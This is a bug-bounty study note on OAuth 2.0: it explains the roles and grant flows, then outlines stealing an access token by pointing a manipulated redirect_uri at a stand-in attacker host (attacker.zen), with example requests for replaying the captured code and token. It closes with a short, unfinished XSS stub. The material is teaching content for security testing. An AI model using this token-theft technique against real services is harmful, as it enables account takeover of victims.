---
description: OAuth - Authentication - Authorization - Bug Bounty - Credentials
---

# OAuth

{% embed url="https://www.youtube.com/watch?ab_channel=ByteByteGo&v=ZV5yTm4pT8g" %}

## <mark style="color:yellow;">What is OAuth 2.0</mark>

Is giving a user a resource key from an application which enables the user to get acces to another applications specific data like user or work info. This all happens without using a password.

OAuth entities

| Entity               | Description                                                           |
| -------------------- | --------------------------------------------------------------------- |
| Resource Owner       | Owns the resource like a photo (resource)                             |
| Client               | Service requesting access to photo (resource)                         |
| Authorization Server | Server authenticates resource owner and gives access tokens to client |
| Resource Server      | Server hosting the photo (resource)                                   |

Example:

{% stepper %}
{% step %}
#### Login

Joe uses login with zenlogin.com on zenprint.io, redirected to zenlogin.com
{% endstep %}

{% step %}
#### Login zenlogin.com

Joe logs in and gives acces to his photos on zenprint.io. It receives a authorization grant to zenprint.io
{% endstep %}

{% step %}
#### Authorization grant

zenprint.io presents authorization grant to zenlogin.com
{% endstep %}

{% step %}
#### Authorization grant validation

zenlogin.com validates the authorization grant and issues an access token with acces to photos on zenprint.io
{% endstep %}

{% step %}
#### Access token

zenprint.io presents access token to zenlogin.com API endpoint to access the photos.
{% endstep %}

{% step %}
#### Validation token

zenlogin.com validates the token and provides the photo.
{% endstep %}
{% endstepper %}

### <mark style="color:yellow;">Authorization Code Grant vs Implicit grant</mark>

Most common and secure is the authorization code grant which follows the flow shown above. The implicit code grant is shorter because the authorization code exchange is skipped. This results in exposing acces tokens in the browser. Client-side Javascript application might use this.

### <mark style="color:yellow;">Stealing OAuth Access Token</mark>

If an attacker is in able to impersonate the victin by stealing their access token by manipulating the `redirect_uri` to the attackers system. This can happen if the `redirect_uri` is not properly verified.

1. Create manipulated `redirect_uri`

```html
http://zenlogin.com/authorization/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=http://attacker.zen:57669//callback&state=something
```

2. Obtain cliend\_id by using own credentials.
3. Deliver ilnk to victim
4. Receive authorization code and force an acces token

```
GET /client/callback?code=A0FCQUFBQm1BeHdCNEZEQVdxMFR0Tl9aSEg0SThQME9SU2s2V3Y3VE9teTM2V0JLcDRTM0Jwc0NBMG9Oc09vNGlqWjNZMDFVcGlsR3ZnWmdmRzJ3Q0wtdGtSbWNqXzBHY0o4RzBtMzlKN2h3WFlNcjltc2drNkNFUlAzcnJzUTd6SnVFbTJCWmZ6WDYtVm13V1pSRW5kMlBqcWRnQkVReUZRPT0&state=something HTTP/1.1
Host: zenlogin.com
Cookie: state=somevalue
```

5. Impersonate using token

```
GET /client/ HTTP/1.1
Host: zenprint.io
Cookie:  access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0Yi1zdGRudCIsImlzcyI6Imh1YmdpdC5odGIiLCJleHAiOjE3MTE0ODQwMjAuODQ2M <snip>
```

Usually the `redirect_uri` is validated using a whitelist. Depening on the validation there might be potential bypasses.

{% hint style="info" %}
If a state parameter is not present a CSRF might be possible.
{% endhint %}

### <mark style="color:yellow;">XSS</mark>

In particular reflected XSS occurs. Reflected XSS occurs when a value from the request is reflected in the response.

<figure><img src="broken-reference" alt=""><figcaption><p>Source: Geeksforgeeks</p></figcaption></figure>
